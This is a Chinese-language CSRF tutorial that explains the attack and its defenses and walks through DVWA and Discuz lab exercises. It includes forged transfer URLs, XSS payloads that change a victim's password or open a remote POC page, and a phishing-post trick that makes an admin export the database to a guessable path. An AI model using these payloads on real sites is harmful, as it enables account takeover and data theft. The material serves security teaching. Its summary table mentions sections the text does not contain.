# CSRF攻击

## 一、是什么

CSRF是Web应用程序的一种常见漏洞，其攻击特性是危害性大但非常隐蔽，尤其是在大量Web 2.0技术的应用背景下，攻击者完全可以在用户毫无察觉的情况下发起CSRF攻击。

**Cross-site request forgery** 简称为"CSRF"，中文叫**跨站请求伪造**。在CSRF的攻击场景中，攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也被称为 **"one click"攻击**——点击攻击，需要用户触发攻击动作。

> 💡 一句话理解：从别的网站偷偷发请求，这个请求被伪造，误以为是本站主动操作的，**冒充你本人在目标网站操作**。

CSRF之所以能成功，主要是因为程序员开发的时候，未对请求进行参数比如 `token` 和 `Referer` 等的判断，造成攻击者可构造自己的URL地址欺骗目标用户进行点击。

---

## 二、为什么重要

安全业界称CSRF为**"沉睡的巨人"**，其威胁程度由此"美誉"便可见一斑。

### 攻击流程

当我们打开网站或者登陆某个网站后，就会产生一个会话（这里指用户登陆后），这个会话可能是 **SESSION**（存在服务器上）、**Cookie**（存在浏览器上）控制认证身份信息的。重点是浏览器与服务器之间是在会话之中（会话 = 浏览器和服务器之间一段连续、可识别身份的交互过程），在这个会话没有结束时候，你可以利用你的权限对网站进行操作，如进行发表文章、发邮件、删除文章等操作。当这个会话结束后，你在进行某些操作时候Web应用程序通常会来提醒你：您的会话已过期，或者是请重新登陆等提示。

这非常好理解，就像我们登陆网上银行后，Web浏览器已经跟可信的站点建立了一个经认证的会话。之后，只要是通过该Web浏览器这个认证的会话所发送的请求，自动带上 Cookie 里的 `SessionID`；服务器拿着 ID 匹配服务端存在的有效 Session，认定这是你本人操作，直接执行交易，都被视为可信的动作，例如转账、汇款等操作。当我们在一段时间内不进行操作后，再来重新做转账或者汇款操作，那么这个站点可能会提示你：您的身份已过期，请重新登陆或者会话结束等消息。

而CSRF攻击则是**建立在会话之上的攻击**，此时的你的 Cookie、Session 都还有效。比如当你登陆了网上银行，正在进行转账业务，这时你的某个QQ好友（攻击者）发来一条消息（URL），这条消息是攻击者精心构造的转账业务代码，而且与你所登录的网站是同一个银行。你可能认为这个网站是安全的，并不是什么钓鱼网站之类的，然后打开了这条URL——那么你的账户的钱可能就在你的这一次小小点击上全部丢失。

> ⚠️ 怎么可能这么神奇呢？其实这并不神奇。主要是因为你的浏览器正处于与此网站的会话之中，Cookie、Session 都还有效，那么一些操作都是合法的，而入侵者构造的这段代码只不过是正常的转账操作代码而已。

比如说你想给用户 `spisec` 转账1000元，那么点击提交按钮之后，可能会发送以下请求：

```
http://www.taobao.com/pay.jsp?user=spisec&money=1000
```

而攻击者仅仅是改变一下 `user` 参数与 `money` 参数即可完成一次"合法"的攻击，如：

```
http://www.taobao.com/pay.jsp?user=hack&money=10000
```

当你访问了这条URL之后，就会自动向 `hack` 这个账户里面转入10000元。而这是你亲手造成的，并没因为有人去破解你的密码或者是Web服务器被入侵所导致的你的金钱丢失。

> 💡 其实这个请求一般是POST请求方法，但是如果开发人员接收数据的时候使用的是 `$_REQUEST` 来接收的，那么这个方法不仅仅接收POST，什么GET、Cookie都能接收，这就出问题了。

### 流程总结

1. 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；
2. 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；
3. 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；
4. 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；
5. 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。

| 阶段 | 说明 |
|------|------|
| **前提** | 用户浏览器 ↔ 网站 A 存在有效登录会话 |
| **触发** | 攻击者欺骗用户访问恶意 URL / 恶意站点 |
| **执行** | 恶意页面自动向 A 发起请求，浏览器附带会话 Cookie |
| **结果** | 服务器依托会话身份执行非法操作，CSRF 攻击完成 |

## 三、测试思路 / 前置知识

### 3.1 CSRF分类

CSRF漏洞一般分为**站外**和**站内**两种类型。

**站外类型**：本质上就是传统意义上的外部提交数据问题。通常程序员会考虑给一些留言或者评论的表单加上水印以防止SPAM问题（这里，SPAM可以简单的理解为垃圾留言、垃圾评论，或者是带有站外链接的恶意回复），但是有时为了提高用户的体验性，可能没有对一些操作做任何限制，所以攻击者可以事先预测并设置请求的参数，在站外的Web页面里编写脚本伪造文件请求，或者和自动提交的表单一起使用来实现GET、POST请求。当用户在会话状态下点击链接访问站外Web页面，客户端就被强迫发起请求。

**站内类型**：在一定程度上是由于程序员滥用 `$_REQUEST` 类变量造成的。在一些敏感的操作中（如修改密码、添加用户等），本来要求用户从表单提交发起POST请求传递参数给程序，但是由于使用了 `$_REQUEST` 等变量，程序除支持接收POST请求传递的参数外也支持接收GET请求传递的参数，这样就会为攻击者使用CSRF攻击创造条件。一般攻击者只要把预测的请求参数放在站内一个贴子或者留言的图片链接里，通过GET请求来攻击，受害者浏览了这样的页面就会被强迫发起这些请求。

### 3.2 漏洞检测方法

| 方法 | 工具/手段 | 说明 |
|------|----------|------|
| **扫描器** | AWVS、AppScan 等 | 很快，但是这种漏洞的**误报率很高** |
| **手工验证** | Burp Suite | 抓取正常请求数据包，去掉 `Referer` 字段后重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞 |
| **第三方工具** | CSRFTester（OWASP组织开发）、CSRF Request Builder 等 | 自动化POC生成与验证 |

### 3.3 手工测试方法

检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是：**抓取一个正常请求的数据包，去掉 `Referer` 字段后再重新提交**，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。同时看是否有 `csrf_token`。

## 四、核心内容

### 4.1 GET型CSRF：利用URL/图片标签发起请求

**原理**：GET请求参数直接暴露在URL中，攻击者只需构造一个包含恶意参数的URL，将其嵌入 `<img>` 标签或超链接中，当受害者访问该页面时，浏览器自动发送该GET请求并携带Cookie。

**前提**：
- 目标操作为GET请求（或虽为POST但后端使用 `$_REQUEST` 接收参数）
- 受害者处于已登录状态，会话有效

#### 演示：转账攻击

```
# 正常转账请求 —— 给 spisec 转 1000 元
http://www.taobao.com/pay.jsp?user=spisec&money=1000

# 攻击者篡改后的请求 —— 给 hack 转 10000 元
http://www.taobao.com/pay.jsp?user=hack&money=10000
```

### 4.2 POST型CSRF：隐藏表单 + 自动提交

**原理**：当目标操作为POST请求时，攻击者无法直接通过URL完成攻击。此时可以构造一个HTML页面，内部包含一个**隐藏表单**（`<input type="hidden">`），通过JavaScript自动提交该表单，受害者访问页面时即在不知情的情况下发出POST请求。

**前提**：
- 目标为POST请求，参数在请求体中
- 受害者处于已登录状态，会话有效

### 4.4 防御绕过：Referer 校验

当后台使用 Referer 校验来防御CSRF时，绕过思路也很直接。

**DVWA Medium等级源码分析**：

```php
// 检查 HTTP_REFERER 是否包含当前服务器主机名
// 如果不是从本站页面跳转过来的请求，则拒绝
if (stripos($_SERVER['HTTP_REFERER'], $_SERVER['SERVER_NAME']) !== false) {
    // 通过验证，执行密码修改
}
```

这段逻辑的意思是：如果上一页跳转来源URL和你的主机名不相等，那么报错——换句话说就是：如果不是从你主机的一个页面跳转到另一个页面，那么就报错，防止了从别的主机上发来的恶意请求。

**绕过方式**：可以通过抓包手动添加或修改 `Referer` 字段。

### 4.5 防御绕过：CSRF Token 校验

**DVWA High等级源码分析**：

```php
// 比对前端提交的 user_token 与 服务端 Session 中存储的 session_token
// 只有一致时才认为是本站用户主动提交，而非跨站伪造请求
checkToken($_REQUEST['user_token'], $_SESSION['session_token'], 'index.php');
```

**Token 机制流程**：

```
会话就绪 → 生成 session_token，存入 $_SESSION
渲染页面时 → 把 $_SESSION['session_token'] 的值输出到表单/URL，作为前端的 user_token
```

![image-20260716221709337](/assets/images/14/image-20260716221709337.png)

从别的恶意主机上没有 `user_token` 就无法修改密码。`user_token` 是访问页面成功之后才会生成的。

**绕过思路**：那如果恶意主机先让你去成功访问一次网站，获取到 Token 之后再去修改密码就可以成功。

### 4.6 XSS + CSRF 组合攻击

如果你发现某个网站修改密码的地方有CSRF漏洞，但是你制作的测试漏洞的POC没有人点击，没办法交给某些测试用户来运行访问等，那么导致这个CSRF漏洞没办法被利用；而你又发现这个网站有个XSS漏洞，但是通过这个XSS漏洞又没办法拿到用户的Cookie信息等，导致XSS漏洞也不是什么高危漏洞，可利用的能力比较低——那么你就可以想到**XSS结合CSRF漏洞组合发动攻击**。

> 💡 基于存储型XSS来发起CSRF攻击：当访问到含有XSS存储型漏洞的页面时会自动弹窗，就相当于自动帮你点击了POC，这个POC一般会被恶意人员伪装得很隐蔽，诱导你来点击链接什么的，只要你点了链接你就被攻击了。

**环境**：DVWA靶场，安全等级为Low。

#### 针对单用户

```html
<!-- 利用 <script> 标签的 src 属性直接发起CSRF请求修改密码 -->
<script src='http://192.168.239.131/dvwa/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change'>
</script>
```

> ⚠️ 直接在有XSS存储型漏洞页面上修改密码，但缺点是**只能对单用户进行攻击**。

![image-20260717215824702](/assets/images/14/image-20260717215824702.png)

再次登录发现密码就被修改了。

#### 针对多用户

```html
<!-- src设为"x"必然加载失败 → 触发onerror → 自动打开恶意POC页面 -->
<script src="x"
onerror=javascript:window.open("http://192.168.239.132/111.html")></script>
```

访问路径 `"x"`，显然不成功，然后 `onerror` 事件触发，自动帮你访问恶意主机上的POC修改密码。

### 5.2 Discuz 论坛拖库 —— GET 请求实战

> 拖库本来是数据库领域的术语，指从数据库中导出数据。到了黑客攻击泛滥的今天，它被用来指网站遭到入侵后，黑客窃取其数据库。

**攻击思路**：在论坛上面发一个骗人的帖子，当管理员点击帖子时，触发数据库备份请求，攻击者即可通过预先设定的路径访问备份文件。

**步骤一：分析数据库备份请求**

先登录Discuz的后台 (`http://192.168.xxx.xxx/dz/admin.php`)，模拟管理员进行周期性的数据库备份。

找到 **UCenter** 并登录：

![image-20260716174430535](/assets/images/14/image-20260716174430535.png)

找到**数据备份**，我们开启BP，点击提交之后进行抓包：

![image-20260716174506336](/assets/images/14/image-20260716174506336.png)

![image-20260716174600990](/assets/images/14/image-20260716174600990.png)

发现数据备份就是发了一个GET请求：

```
/dz/uc_server/admin.php?m=db&a=operate&t=export&appid=1&backupdir=backup_260716_Rrlbvb
```

放行请求后，找到网站后台用于存储数据备份的目录：

```
C:\tools\phpstudy\PHPTutorial\WWW\dz\data\backup_260716_n3717B
```

![image-20260716174920116](/assets/images/14/image-20260716174920116.png)

发现生成了一些 `.sql` 文件，打开文件，发现里面是一些SQL语句，通过这些SQL语句就可以获取到网站的所有信息：

![image-20260716175013468](/assets/images/14/image-20260716175013468.png)

**步骤二：加工备份请求，预设文件路径**

我们把刚才获取到的请求进行加工，把文件存储位置改成一个可控的路径：

```
http://192.168.239.131/dz/uc_server/admin.php?m=db&a=operate&t=export&appid=1&backupdir=xxxx%26backupfilename%3Daaaa
```

> 💡 URL编码说明：
> - `%26` 表示 `&`
> - `%3D` 表示 `=`
>
> 相当于创建了一个 `xxxx` 文件夹（备份目录一定是有写入权限的，不然管理员他自己都不能备份文件的），然后在 `xxxx` 目录中创建一个 `aaaa` 文件作为备份数据的文件名称，不然他随机生成的文件名称我们不知道的。

**步骤三：发帖钓鱼，触发备份**

我们用普通用户登录进行发帖。

我们欺骗管理员说图片加载不上来，请求他帮忙看一下的帖子，并且在帖子中点击图片按钮 → **网络图片**，并把之前加工好的请求URL写上，把图片长宽设置为0，这样就伪造出了确实显示不出来图片的假象。

![image-20260716180311507](/assets/images/14/image-20260716180311507.png)

切换到管理员用户，发现用户提出的意见：

![image-20260716182132933](/assets/images/14/image-20260716182132933.png)

当管理员一点击这个帖子，之前普通用户在帖子中写的那串请求就被执行了，在 `xxxx` 目录下生成了备份文件：

![image-20260716182254378](/assets/images/14/image-20260716182254378.png)

此时管理员不知道备份文件已经生成，那么恶意人员就可以通过自己设置的文件路径去访问到这个文件，就形成了拖库：

![image-20260716182653635](/assets/images/14/image-20260716182653635.png)

## 六、总结

### 攻击手法 × 防御手段 对照表

| 场景 | 攻击方式 | 防御手段 | 绕过方式 |
|------|---------|---------|---------|
| **GET 请求** | 构造恶意URL，嵌入 `<img>` 或 `<a>` 标签 | 敏感操作用POST | `$_REQUEST` 接收参数时GET同样生效 |
| **POST 请求** | 隐藏表单 + 自动提交 | 区分POST/GET | 构造同源HTML页面 |
| **自解压包** | WinRAR "提取后运行" + 恶意URL | N/A（用户端） | 诱导解压 |
| **Referer 校验** | 站外伪造请求 | 验证 `HTTP_REFERER` | 手动添加/修改 `Referer` 头 |
| **CSRF Token** | 站外伪造请求 | 验证一次性 `csrf_token` | `CSRF Token Tracker` 插件同步Token |
| **XSS + CSRF** | 存储型XSS自动触发CSRF | 同时修复XSS和CSRF | `<script src/onerror>` 组合 |
| **链接暴露** | 直接URL | — | 短链接服务隐匿 |

### 服务端防御策略

目前业界服务器端防御CSRF攻击主要有以下策略：

| 策略 | 原理 | 评价 |
|------|------|------|
| **验证 HTTP Referer** | 检查请求来源是否为本站域名 | 有绕过风险（可手动添加Referer） |
| **请求地址添加 Token** | 在HTTP请求中加入随机产生的token，服务器端验证 | 较可靠，但每个请求都需携带token |
| **HTTP头自定义属性** | 通过 `XMLHttpRequest` 在请求头中加入 `csrftoken`，地址栏不可见 | 解决了URL中token暴露问题 |
| **严格区分 POST 与 GET** | 不用GET执行持久性操作（增删改），避免使用 `$_REQUEST` | 基础但有效 |
| **验证码 / 原密码确认** | 关键操作需要二次验证 | 用户体验稍差，但非常有效 |

### 用户端防护建议

对于普通用户来说，都学习并具备网络安全知识以防御网络攻击是不现实的。但若用户养成良好的上网习惯，则能够很大程度上减少CSRF攻击的危害：

1. **不要轻易点击**网络论坛、聊天室、即时通讯工具或电子邮件中出现的链接或者图片；
2. **及时退出**长时间不使用的已登录账户，尤其是系统管理员，应尽量在登出系统的情况下点击未知链接和图片；
3. **安装安全防护软件**，并及时更新软件厂商发布的特征库，以保持安全软件对最新攻击的实时跟踪。

### 安全设备防御

由于从漏洞的发现到补丁的发布需要一定的时间，而且相当比例的厂商对漏洞反应不积极，再加之部分系统管理员对系统补丁的不够重视，这些都给了攻击者可乘之机。用户可以借助第三方的专业安全设备加强对CSRF漏洞的防御。

---

> 🎯 **一句话总结**：CSRF的核心在于**利用用户已有的登录态发起伪造请求**。防御的关键是**区分"用户主动发起的请求"和"被伪造的请求"**——Token校验做得好的话，CSRF基本无解；但现实是很多站点连Referer都不校验，而更多站点虽然加了Token却用 `$_REQUEST` 全盘接收，等于白加。
